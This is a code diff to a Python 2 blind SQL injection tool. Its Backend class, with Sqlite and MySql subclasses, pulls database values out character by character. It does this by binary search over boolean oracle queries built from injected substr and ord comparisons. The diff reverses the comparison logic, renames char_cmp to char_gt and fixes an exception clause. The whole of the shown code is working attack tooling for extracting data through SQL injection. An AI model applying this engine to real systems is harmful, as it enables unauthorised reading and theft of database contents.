@@ -15,10 +15,10 @@ class Backend(object):
             sys.stdout.write('\r[%d, %d]    ' % (lo, hi))
             sys.stdout.flush()
             mid = (lo+hi)/2
-            if self.eval_bool("(%s)<=%d" % (expr, mid)):
-                hi = mid
-            else:
+            if self.eval_bool("(%s)>%d" % (expr, mid)):
                 lo = mid + 1
+            else:
+                hi = mid
         sys.stdout.write('\r= %d       ' % lo)
         print
         return lo
@@ -27,19 +27,18 @@ class Backend(object):
         lo, hi = char_range
         while lo < hi:
             mid = (lo+hi)/2
-            if self.char_cmp(expr, i, mid):
-                hi = mid
-            else:
+            if self.char_gt(expr, i, mid):  # expr[i] > mid
                 lo = mid + 1
+            else:
+                hi = mid
         return chr(lo)
 
     def eval_str(self, expr, len_range=(0,100), char_range=None, tries=10, n=10):
         if not char_range:
             char_range = self.__class__.char_range
         res = ""
-        lo, hi = len_range
         print "Finding length..."
-        sz = self.eval_num("length((%s))" % expr)
+        sz = self.eval_num("length((%s))" % expr, r=len_range)
         res = ["?"]*sz
         mx = threading.Lock()
         sys.stdout.write("".join(res))
@@ -53,7 +52,7 @@ class Backend(object):
                         sys.stdout.write('\r' + "".join(res))
                         sys.stdout.flush()
                         return
-                except e:
+                except Exception, e:
                     pass
             raise e
         par.iter_parallel(task, range(sz), n=n)
@@ -68,14 +67,14 @@ class Sqlite(Backend):
     def __init__(self, eval_bool):
         self.eval_bool = eval_bool
     char_range = (48,125)
-    def char_cmp(self, str_expr, i, c):
-        return self.eval_bool("substr((%s),%d,1)<='%s'" % (str_expr, i+1, chr(c)))
+    def char_gt(self, str_expr, i, c):
+        return self.eval_bool("substr((%s),%d,1)>'%s'" % (str_expr, i+1, chr(c)))
 
 class MySql(Backend):
     def __init__(self, eval_bool):
         self.eval_bool = eval_bool
     char_range = (0,255)
-    def char_cmp(self, str_expr, i, c):
-        return self.eval_bool("ord(substr((%s),%d,1))<=%d" % (str_expr, i+1, c))
+    def char_gt(self, str_expr, i, c):
+        return self.eval_bool("ord(substr((%s),%d,1))>%d" % (str_expr, i+1, c))
     def encode_str(self, s):
         return '0x' + s.encode('hex')
